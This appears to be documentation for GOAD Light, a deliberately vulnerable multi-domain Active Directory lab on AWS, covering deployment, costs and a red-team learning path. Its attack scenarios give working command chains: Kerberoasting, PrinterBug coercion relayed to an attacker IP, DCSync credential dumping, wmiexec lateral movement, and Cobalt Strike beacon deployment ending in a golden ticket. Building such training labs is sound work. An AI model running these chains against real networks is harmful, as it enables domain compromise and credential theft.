# GOAD Light - Multi-Domain Lab

## Overview

GOAD Light provides a **multi-domain Active Directory environment** with parent-child trust relationships, offering more realistic attack scenarios than GOAD Mini while maintaining reasonable costs.

## Architecture Components

### Infrastructure

| Component | Specifications | Purpose |
|-----------|---------------|---------|
| **GOAD Jumpbox + CS** | t3.medium, Public IP | Lab access & Cobalt Strike server |
| **DC01** | t3.medium, 10.10.1.10 | Root Domain Controller - sevenkingdoms.local |
| **DC02** | t3.medium, 10.10.1.11 | Child Domain Controller - north.sevenkingdoms.local |
| **SRV02** | t3.medium, 10.10.1.22 | Member Server (File/Print/IIS) |

### Domain Structure

```
Forest: sevenkingdoms.local (Root)
├── DC01 (sevenkingdoms.local)
└── DC02 (north.sevenkingdoms.local) ← Child Domain
    └── SRV02 (Member Server)
```

### Network Configuration

- **VPC CIDR**: 10.10.0.0/16
- **Public Subnet**: Jumpbox with internet gateway
- **Private Subnet**: 10.10.1.0/24 for all AD components
- **Trust Relationships**: Automated parent-child domain trust

## Key Features

### 1. Multi-Domain Environment
- **Parent Domain**: sevenkingdoms.local (DC01)
- **Child Domain**: north.sevenkingdoms.local (DC02)
- **Automatic trust configuration** during deployment
- **Realistic enterprise structure** for cross-domain attacks

### 2. Member Server (SRV02)
- **File shares** for privilege escalation practice
- **IIS web server** for web-based attacks
- **Print server** for PrinterBug coercion attacks
- **SQL Server** (optional) for database attacks

### 3. Advanced Attack Vectors

#### Cross-Domain Attacks
- ✅ **Trust Enumeration** - Map parent-child relationships
- ✅ **Cross-Domain Kerberoasting** - Target SPNs across trusts
- ✅ **SID History Injection** - Domain escalation attacks
- ✅ **Trust Key Extraction** - Forge inter-realm TGTs

#### Coercion Attacks
- ✅ **PrinterBug** (MS-RPRN) - Force authentication
- ✅ **PetitPotam** (MS-EFSRPC) - Coerce NTLM authentication
- ✅ **DFSCoerce** - DFS-based coercion

#### Privilege Escalation
- ✅ **Unconstrained Delegation** - Computer account compromise
- ✅ **Constrained Delegation** - Service account abuse
- ✅ **Resource-Based Constrained Delegation** (RBCD)

## Deployment

### Configuration

```hcl
# terraform.tfvars
goad_lab_type = "GOAD-Light"
goad_jumpbox_instance_type = "t3.medium"

# Optional: Custom instance sizes
goad_dc_instance_type = "t3.medium"
goad_server_instance_type = "t3.medium"
```

### Via Web Application

1. Navigate to **Configuration** page
2. Select **GOAD Lab Type**: "GOAD Light"
3. Review estimated cost: ~$200-250/month
4. Click **Deploy**
5. Monitor progress (deployment takes 45-60 minutes)

### Via Command Line

```bash
cd terraform
terraform apply -var="goad_lab_type=GOAD-Light"
```

## Attack Scenarios

### Scenario 1: Trust Enumeration with BloodHound

```bash
# From jumpbox - collect from both domains
bloodhound-python -d sevenkingdoms.local -u user -p password -ns 10.10.1.10 -c all
bloodhound-python -d north.sevenkingdoms.local -u user -p password -ns 10.10.1.11 -c all

# Analyze trust relationships
# BloodHound will show: north.sevenkingdoms.local → sevenkingdoms.local (Parent-Child)
```

### Scenario 2: Cross-Domain Kerberoasting

```bash
# Enumerate SPNs across both domains
GetUserSPNs.py sevenkingdoms.local/user:password -dc-ip 10.10.1.10 -request
GetUserSPNs.py north.sevenkingdoms.local/user:password -dc-ip 10.10.1.11 -request

# Crack tickets offline
hashcat -m 13100 tickets.txt wordlist.txt
```

### Scenario 3: PrinterBug to DC Coercion

```bash
# Force DC02 to authenticate to attacker-controlled machine
python3 printerbug.py north.sevenkingdoms.local/user:password@10.10.1.11 <attacker-ip>

# Capture NTLM hash with Responder/ntlmrelayx
ntlmrelayx.py -t ldap://10.10.1.11 --delegate-access
```

### Scenario 4: Lateral Movement Path

```bash
# 1. Compromise SRV02 (Member Server)
crackmapexec smb 10.10.1.22 -u user -p password -x "whoami"

# 2. Extract credentials from SRV02
secretsdump.py north.sevenkingdoms.local/user:password@10.10.1.22

# 3. Move to DC02 (Child Domain)
wmiexec.py north.sevenkingdoms.local/administrator@10.10.1.11

# 4. Perform DCSync on child domain
secretsdump.py north.sevenkingdoms.local/administrator@10.10.1.11 -just-dc

# 5. Use child domain admin to access parent (DC01)
# Child domain admins can often access parent domain resources
```

### Scenario 5: Cobalt Strike Multi-Domain Campaign

```bash
# 1. Deploy beacon on SRV02
generate → Windows Executable → Save as payload.exe

# 2. Lateral movement to DC02
shell copy \\10.10.1.22\C$\payload.exe \\10.10.1.11\C$\
shell wmic /node:10.10.1.11 process call create C:\payload.exe

# 3. Beacon from DC02 → CS Server on jumpbox

# 4. Perform DCSync from compromised DC
dcsync north.sevenkingdoms.local NORTH\krbtgt

# 5. Create Golden Ticket for child domain
golden_ticket /domain:north.sevenkingdoms.local /sid:S-1-5-21-... /krbtgt:<hash> /user:Administrator
```

## Access Methods

### 1. SSH to Jumpbox (Primary)
```bash
ssh -i ~/.ssh/key.pem ubuntu@<jumpbox-public-ip>
```

### 2. Cobalt Strike Connection
```
Host: <jumpbox-public-ip>:50050
Password: [From deployment output]
```

### 3. RDP to Domain Controllers
```bash
# From jumpbox to DC01
xfreerdp /v:10.10.1.10 /u:Administrator /d:sevenkingdoms /p:'password'

# From jumpbox to DC02
xfreerdp /v:10.10.1.11 /u:Administrator /d:north /p:'password'
```

### 4. SOCKS Proxy for Tools
```bash
# On your local machine
ssh -D 1080 -i ~/.ssh/key.pem ubuntu@<jumpbox-public-ip>

# Configure proxychains
# Then use tools through SOCKS proxy
proxychains crackmapexec smb 10.10.1.0/24
```

## Cost Breakdown

### Monthly Cost Estimate: ~$200-250

| Resource | Type | Quantity | Monthly Cost |
|----------|------|----------|--------------|
| Jumpbox | t3.medium | 1 | ~$30 |
| Domain Controllers | t3.medium | 2 | ~$60 |
| Member Server | t3.medium | 1 | ~$30 |
| EBS Storage | 30GB each | 4 | ~$12 |
| Data Transfer | Minimal | - | ~$10-20 |
| NAT Gateway | (Optional) | 1 | ~$32 |
| S3/CloudWatch | Storage/Logs | - | ~$5 |
| **Total** | | | **~$200-250** |

### Cost Optimization

#### Option 1: Stop When Not in Use (Saves 70%)
```bash
# Stop all instances
aws ec2 stop-instances --instance-ids <jumpbox> <dc01> <dc02> <srv02>
# Monthly cost drops to ~$50-60 (storage only)

# Start when needed
aws ec2 start-instances --instance-ids <jumpbox> <dc01> <dc02> <srv02>
```

#### Option 2: Scheduled Operations
```bash
# Implement Lambda function for auto-start/stop
# Example: Run only during business hours (40 hours/week)
# Savings: ~75% reduction → $50-75/month
```

#### Option 3: Smaller Instance Types
```hcl
# Use t3.small for non-DC components
goad_server_instance_type = "t3.small"  # Saves ~$15/month per instance
```

## Learning Path

### Week 1: Trust Relationships
- Enumerate parent-child trusts
- Map domain structure with BloodHound
- Identify cross-domain attack paths
- Test trust authentication

### Week 2: Lateral Movement
- SMB authentication attacks
- WMI command execution
- RDP lateral movement
- PowerShell remoting

### Week 3: Privilege Escalation
- Kerberoasting across trusts
- Unconstrained delegation abuse
- RBCD attacks
- GPO abuse

### Week 4: Domain Escalation
- DCSync child domain
- SID History injection
- Trust key extraction
- Parent domain compromise

## Troubleshooting

### Issue: Trust relationship broken
```bash
# Verify trust from jumpbox
nltest /server:10.10.1.11 /trusted_domains

# Test authentication across trust
runas /user:sevenkingdoms\administrator cmd
```

### Issue: Cannot reach SRV02
```bash
# Check network connectivity
ping 10.10.1.22
nmap -p 445,3389 10.10.1.22

# Verify it's domain-joined
nslookup srv02.north.sevenkingdoms.local 10.10.1.11
```

### Issue: BloodHound data incomplete
```bash
# Re-run collection with debug
bloodhound-python -d sevenkingdoms.local -u user -p password -ns 10.10.1.10 -c all --debug

# Check DNS resolution
dig @10.10.1.10 sevenkingdoms.local
dig @10.10.1.11 north.sevenkingdoms.local
```

## Advanced Topics

### 1. Cross-Forest Trust Attacks
While GOAD Light is a single forest, it simulates trust mechanics:
- **SID Filtering**: Understand how it's bypassed
- **Selective Authentication**: Not enabled by default
- **Trust Transitivity**: Child-to-parent is transitive

### 2. Credential Replay Protection
Practice NTLM relay mitigations:
- **SMB Signing**: Some hosts have it enabled
- **LDAP Signing**: Test bypass techniques
- **EPA (Extended Protection for Authentication)**

### 3. Advanced Persistence
- **DCShadow**: Replicate malicious AD changes
- **AdminSDHolder**: Modify protected group membership
- **DSRM Password**: Backdoor domain controller

## Best Practices

### Lab Management
- ✅ **Snapshot before major operations** - Easy rollback
- ✅ **Document your attack chains** - Great for reports
- ✅ **Practice cleanup** - Remove artifacts after attacks
- ✅ **Reset credentials periodically** - Start fresh

### Security
- ✅ **Never expose to public** - Use management IP restrictions
- ✅ **Rotate teamserver password** - Especially if shared
- ✅ **Audit access logs** - Practice detection techniques
- ✅ **Destroy when done** - Don't leave running indefinitely

## Comparison: GOAD Mini vs GOAD Light

| Feature | GOAD Mini | GOAD Light |
|---------|-----------|------------|
| **VMs** | 2 (Jumpbox + 1 DC) | 4 (Jumpbox + 2 DCs + 1 Server) |
| **Domains** | 1 | 2 (Parent-Child) |
| **Member Servers** | ❌ None | ✅ 1 (SRV02) |
| **Trust Relationships** | ❌ None | ✅ Parent-Child |
| **Cross-Domain Attacks** | ❌ No | ✅ Yes |
| **Cost/Month** | ~$75-100 | ~$200-250 |
| **Complexity** | Beginner | Intermediate |
| **Best For** | Learning basics | Realistic scenarios |

## References

- [GOAD Light Documentation](https://orange-cyberdefense.github.io/GOAD/labs/GOAD-Light/)
- [Trust Relationship Attacks](https://adsecurity.org/?p=1588)
- [Cross-Domain Kerberoasting](https://www.harmj0y.net/blog/activedirectory/kerberoasting-without-mimikatz/)
- [PrinterBug Exploitation](https://www.praetorian.com/blog/red-team-printer-bug-abuse/)

## Summary

GOAD Light offers the **perfect balance** between complexity and cost:
- ✅ **Multi-domain environment** with parent-child trust
- ✅ **Member server** for realistic lateral movement
- ✅ **Advanced attack vectors** (coercion, delegation, trusts)
- ✅ **Moderate cost** (~$200-250/month, or $50-75 with stop/start)
- ✅ **Intermediate difficulty** - ideal after mastering GOAD Mini

Recommended for red teamers ready to practice enterprise-level attacks!
